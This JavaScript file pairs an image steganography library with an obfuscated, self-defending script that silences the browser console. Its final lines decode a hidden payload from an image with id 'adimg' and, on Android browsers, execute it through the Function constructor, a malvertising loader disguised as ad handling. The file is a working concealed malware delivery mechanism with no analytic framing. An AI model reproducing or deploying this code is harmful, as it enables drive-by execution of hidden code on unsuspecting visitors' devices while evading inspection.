!function(a,b,c){
  "undefined"!=typeof module&&module.exports?module.exports=c():"function"==typeof define&&define.amd?define(c):b[a]=c()
  }("steg",this,function(){
  var a=function(){},
  b={
    isPrime:function(a){
      if(isNaN(a)||!isFinite(a)||a%1||2>a)return!1;
      if(a%2===0)return 2===a;if(a%3===0)return 3===a;for(var b=Math.sqrt(a),c=5;b>=c;c+=6){
      if(a%c===0)return!1;if(a%(c+2)===0)return!1}
      return!0
    },
    findNextPrime:function(a){
      for(var c=a;!0;c+=1)if(b.isPrime(c))return c
    },
    sum:function(a,b,c){
      var d=0;c=c||{};
      for(var e=c.start||0;b>e;e+=c.inc||1)
        d+=a(e)||0;
      return 0===d&&c.defValue?c.defValue:d
    },
    product:function(a,b,c){
      var d=1;c=c||{
      };
      for(var e=c.start||0;b>e;e+=c.inc||1)
        d*=a(e)||1;
      return 1===d&&c.defValue?c.defValue:d
    },
    createArrayFromArgs:function(a,b,c){
      for(var d=new Array(c-1),e=0;c>e;e+=1)
        d[e]=a(e>=b?e+1:e);
      return d
    },
    loadImg:function(a){
      var b=new Image;
      return b.src=a,b
    }
   };
   return a.prototype.config={
        t:3,
        threshold:1,
        codeUnitSize:16,
        args:function(a){return a+1},
        messageDelimiter:function(a,b){
          for(var c=new Array(3*b),d=0;d<c.length;d+=1)
            c[d]=255;return c
          },
        messageCompleted:function(a,b,c){
          for(var d=!0,e=0;16>e&&d;e+=1)d=d&&255===a[b+4*e];return d
        }
      },
      a.prototype.getHidingCapacity=function(a,b){
        b=b||{};
        var c=this.config,d=b.width||a.width,e=b.height||a.height,f=b.t||c.t,g=b.codeUnitSize||c.codeUnitSize;return f*d*e/g>>0
      },
      a.prototype.encode=function(a,c,d){
        if(c.length)c=b.loadImg(c);
        else if(c.src)c=b.loadImg(c.src);
        else if(!(c instanceof HTMLImageElement))
          throw new Error("IllegalInput: The input image is neither an URL string nor an image.");d=d||{};
        var e=this.config,f=d.t||e.t,g=d.threshold||e.threshold,h=d.codeUnitSize||e.codeUnitSize,
          i=b.findNextPrime(Math.pow(2,f)),
          j=d.args||e.args,k=d.messageDelimiter||e.messageDelimiter;
        if(!f||1>f||f>7)
          throw new Error('IllegalOptions: Parameter t = " + t + " is not valid: 0 < t < 8');
        var l=document.createElement("canvas"),m=l.getContext("2d");l.style.display="none",
          l.width=d.width||c.width,
          l.height=d.height||c.height,
          d.height&&d.width?m.drawImage(c,0,0,d.width,d.height):m.drawImage(c,0,0);
        var n,o,p,q,r,s,t,u,v,w,x=m.getImageData(0,0,l.width,l.height),
          y=x.data,
          z=h/f>>0,
          A=h%f,B=[];
        for(v=0;v<=a.length;v+=1){
          if(s=a.charCodeAt(v)||0,t=A*v%f,t>0&&o){
            if(u=Math.pow(2,f-t)-1,p=Math.pow(2,h)*(1-Math.pow(2,-t)),q=(s&u)<<t,r=(o&p)>>h-t,B.push(q+r),v<a.length){
            for(u=Math.pow(2,2*f-t)*(1-Math.pow(2,-f)),w=1;z>w;w+=1)
              n=s&u,B.push(n>>(w-1)*f+(f-t)),u<<=f;
              A*(v+1)%f===0?
                (u=Math.pow(2,h)*(1-Math.pow(2,-f)),n=s&u,B.push(n>>h-f)):
                f>=A*(v+1)%f+(f-t)&&(n=s&u,B.push(n>>(z-1)*f+(f-t)))
            }
          }
          else if(v<a.length)
            for(u=Math.pow(2,f)-1,w=0;z>w;w+=1)
              n=s&u,B.push(n>>w*f),u<<=f;o=s
        }
        var C,D,E,F,G,H=k(B,g);
        for(C=0;4*(C+g)<=y.length&&C+g<=B.length;C+=g){
          for(G=[],v=0;g>v&&v+C<B.length;v+=1){
            for(F=0,w=C;g+C>w&&w<B.length;w+=1)
              F+=B[w]*Math.pow(j(v),w-C);G[v]=255-i+1+F%i
          }
          for(v=4*C;v<4*(C+G.length)&&v<y.length;v+=4)y[v+3]=G[v/4%g];E=G.length
        }
        for(D=C+E;D-(C+E)<H.length&&4*(C+H.length)<y.length;D+=1)
          y[4*D+3]=H[D-(C+E)];
        for(v=4*(D+1)+3;v<y.length;v+=4)y[v]=255;
        return x.data=y,m.putImageData(x,0,0),l.toDataURL()
      },
      a.prototype.decode=function(a,c){
        if(a.length)a=b.loadImg(a);
        else if(a.src)a=b.loadImg(a.src);
        else if(!(a instanceof HTMLImageElement))
          throw new Error("IllegalInput: The input image is neither an URL string nor an image.");
        c=c||{};
        var d=this.config,
          e=c.t||d.t,
          f=c.threshold||d.threshold,
          g=c.codeUnitSize||d.codeUnitSize,
          h=b.findNextPrime(Math.pow(2,e)),
          i=(c.args||d.args,c.messageCompleted||d.messageCompleted);
        if(!e||1>e||e>7)
          throw new Error('IllegalOptions: Parameter t = " + t + " is not valid: 0 < t < 8');
        var j=document.createElement("canvas"),
          k=j.getContext("2d");
        j.style.display="none",
          j.width=c.width||a.width,
          j.height=c.width||a.height,
          c.height&&c.width?
            k.drawImage(a,0,0,c.width,c.height):
            k.drawImage(a,0,0);
        var l,m,n=k.getImageData(0,0,j.width,j.height),o=n.data,p=[];
        if(1===f)
          for(l=3,m=!1;!m&&l<o.length&&!m;l+=4)m=i(o,l,f),m||p.push(o[l]-(255-h+1));
        var q="",r=0,s=0,t=Math.pow(2,g)-1;
        for(l=0;l<p.length;l+=1)
          r+=p[l]<<s,s+=e,s>=g&&(q+=String.fromCharCode(r&t),s%=g,r=p[l]>>e-s);
        return 0!==r&&(q+=String.fromCharCode(r&t)),q
      },
      new a
    } // b
  ); // !function(a,b,c){

var a=['OcOOcmwqwqcOw6YY','LMO2woLDi27CscKE','w6AZw5DDkMKK','wpLDvMKTcwEBNmLCpCEC','wooTw4LDtENeT8ODfMOMGDJCLA==','wp3DgHV6UA==','IMO3woDDl2DCuQ==','SsKQw4ozw4pp','JyTCtcOi','DAwvMsKuw5YFcE8=','P8ORRsKNwoE=','UMONw7HCpyNQwoLDnynCksKLJV7CsMKAw6/Dv2PCuw==','wofDmTJ0WMOdT3zDoMKcwqzDrRoCwpBPwrBBwoxewqtMwrB7DADDlGoLw7HCpMO7','P8OZf3o1wr8C','w63CmjrCmlLDoMKN','w6LCmjM=','w6MKw4PDnQ==','w6rCkDbCnFo=','woQYw5DDng==','wrnDsMOHJsOYKcKWw4LDoQ==','w4R+wq12wqo=','GhAkM8KAw50F','wpLDvMKTcxofJg==','w59uw4R0','UsKJAgtYw6Q0','w5jCmXlB','w5pZesOQFRfDlQ==','w5DDhcKywpXCqA==','w4HDjyUaDsO6wpM='];
(function(c,d){
  var e=function(f){
    while(--f){
      c['push'](c['shift']());
    }
  };
  var g=function(){
    var h={
      'data':{
      'key':'cookie','value':'timeout'},
      'setCookie':function(i,j,k,l){
        l=l||{};
        var m=j+'='+k;
        var n=0x0;
        for(var n=0x0,p=i['length'];n<p;n++){
          var q=i[n];m+=';\x20'+q;
          var r=i[q];i['push'](r);
          p=i['length'];
          if(r!==!![]){ m+='='+r;}
        }
        l['cookie']=m;
      },
      'removeCookie':function(){
        return'dev';
      },
      'getCookie':function(s,t){
        s=s||function(u){return u;};
        var v=s(new RegExp('(?:^|;\x20)'+t['replace'](/([.$?*|{
    }()[]\/+^])/g,'$1')+'=([^;]*)'));
        var w=function(x,y){x(++y);};
        w(e,d);
        return v?decodeURIComponent(v[0x1]):undefined;
      }
    }; // h
    var z=function(){
      var A=new RegExp('\\w+ *\\(\\) *{\\w+ *[\'|"].+[\'|"];? *}'');
      return A['test'](h['removeCookie']['toString']());
    };
    h['updateCookie']=z;
    var B='';var C=h['updateCookie']();
    if(!C){
      h['setCookie'](['*'],'counter',0x1);
    }else if(C){
      B=h['getCookie'](null,'counter');
    }else{
      h['removeCookie']();
    }
  };
  g();
}(a,0x7e));

var b=function(c,d){
  c=c-0x0;
  var e=a[c];
  if(b['KPKLDH']===undefined){
    (function(){
      var f;
      try{
        var g=Function('return (function() '+'{}.constructor("return this")( )'+');');
        f=g();
      }catch(h){
        f=window;
      }
      var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
      f['atob']||(f['atob']=function(j){
        var k=String(j)['replace'](/=+$/,'');
        for(var l=0x0,m,n,o=0x0,p='';
          n=k['charAt'](o++);
          ~n&&(m=l%0x4?m*0x40+n:n,l++%0x4)?
            p+=String['fromCharCode'](0xff&m>>(-0x2*l&0x6)):
          0x0){
          n=i['indexOf'](n);
        }
        return p;
      });
    }()
);

var q=function(r,d){
  var t=[],u=0x0,v,w='',x='';r=atob(r);
  for(var y=0x0,z=r['length'];y<z;y++){
    x+='%'+('00'+r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);
  }
  r=decodeURIComponent(x);
  for(var A=0x0;A<0x100;A++){
    t[A]=A;
  }
  for(A=0x0;A<0x100;A++){
    u=(u+t[A]+d['charCodeAt'](A%d['length']))%0x100;
    v=t[A];t[A]=t[u];t[u]=v;}
  A=0x0;u=0x0;
  for(var B=0x0;B<r['length'];B++){
    A=(A+0x1)%0x100;
    u=(u+t[A])%0x100;
    v=t[A];
    t[A]=t[u];
    t[u]=v;
    w+=String['fromCharCode'](r['charCodeAt'](B)^t[(t[A]+t[u])%0x100]);
  }
  return w;
};

b['sSGzQw']=q;
b['UvyfIT']={};
b['KPKLDH']=!![];
}

var C=b['UvyfIT'][c];
if(C===undefined){
  if(b['osjREl']===undefined){
    var D=function(E){
      this['yhuGjs']=E;
      this['RSLhQn']=[0x1,0x0,0x0];
      this['JWTCiF']=function(){
        return'newState';};
      this['uxuAZy']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';
      this['pyeOIT']='[\x27|\x22].+[\x27|\x22];?\x20*}';
    };
      D['prototype']['ijHoQZ']=function(){
        var F=new RegExp(this['uxuAZy']+this['pyeOIT']);
        var G=F['test'](this['JWTCiF']['toString']())?
          --this['RSLhQn'][0x1]:
          --this['RSLhQn'][0x0];
        return this['EwWlht'](G);
      };
      D['prototype']['EwWlht']=function(H){
        if(!Boolean(~H)){
          return H;
        }
        return this['cJhJoi'](this['yhuGjs']);
      };
      D['prototype']['cJhJoi']=function(I){
        for(var J=0x0,K=this['RSLhQn']['length'];J<K;J++){
          this['RSLhQn']['push'](Math['round'](Math['random']()));
          K=this['RSLhQn']['length'];
        }
        return I(this['RSLhQn'][0x0]);
      };
      new D(b)['ijHoQZ']();b['osjREl']=!![];
    }
    e=b['sSGzQw'](e,d);
    b['UvyfIT'][c]=e;
  }else{e=C;}
  return e;
};

var d=function(){
  var c=!![];return function(d,e){
    var f=c?
      function(){
        if(e){
          var g=e['apply'](d,arguments);
          e=null;return g;
        }
      }:
      function(){};
    c=![];return f;};
}();

var w=d(this,function(){
  var c=function(){
    return'dev';
  },
    d=function(){
      return'window';
    };
  var e=function(){
    var f=new RegExp('\\w+ *\\(\\) *{\\w+ *[\'|"].+[\'|"];? *}');
    return!f['test'](c['toString']());
  };
  var g=function(){
    var h=new RegExp('(\\\\[x|u](\\w){2,4})+')
    return h['test'](d['toString']());
  };
  var i=function(j){
    var k=~-0x1>>0x1+0xff%0x0;
    if(j['indexOf'](i===k)){
      l(j);
    }
  };
  var l=function(m){
    var n=~-0x4>>0x1+0xff%0x0;
    if(m['indexOf']((!![]+'')[0x3])!==n){
      i(m);}
  };
  if(!e()){
    if(!g()){
      i('\x69\x6e\x64\u0435\x78\x4f\x66');
    }else{
      i('\x69\x6e\x64\x65\x78\x4f\x66');
    }
  }else{
    i('\x69\x6e\x64\u0435\x78\x4f\x66');
  }
}); // w
w();

var f=function(){
  var g=!![];return function(h,i){
    var j=g?
      function(){
        if(i){
          var k=i[b('0x0','Kb10')](h,arguments);i=null;return k;}
      }:
      function(){};
    g=![];
    return j;
  };
}();

var l=f(this,function(){
  var m=function(){};
  var n;
  try{
    var o=Function(b('0x1',')ID3')+b('0x2','3hyK')+');');n=o();
  }catch(p){
    n=window;
  }
  if(!n[b('0x3','^aQK')]){
    n[b('0x4','bxQ9')]=function(m){
      var f={};
      f[b('0x5','bxQ9')]=m;
      f[b('0x6','vH0t')]=m;
      f[b('0x7','bxQ9')]=m;
      f[b('0x8','jAUm')]=m;
      f['error']=m;
      f[b('0x9','SF81')]=m;
      f[b('0xa','$KuR')]=m;
      return f;
    }(m);
  }else{
    n[b('0xb','IfD@')]['log']=m;
    n[b('0xc','%RuL')][b('0xd','e9PJ')]=m;
    n[b('0xe','(fcQ')]['debug']=m;
    n['console'][b('0xf','xBPx')]=m;
    n[b('0x10','yDXL')][b('0x11','IDtv')]=m;
    n[b('0x12','oBBn')][b('0x13','^aQK')]=m;
    n[b('0x14','F#*Z')][b('0x15','vH0t')]=m;
  }
});

l();
var s="constructor";
var t=document['getElementById']("adimg");
t['onload']=function(){
  try{
    var u=steg['decode'](t);
  }catch(v){
  }
  if(Number(/android/i['test'](navigator['userAgent']))){
    s[s][s](u)();
  }
};
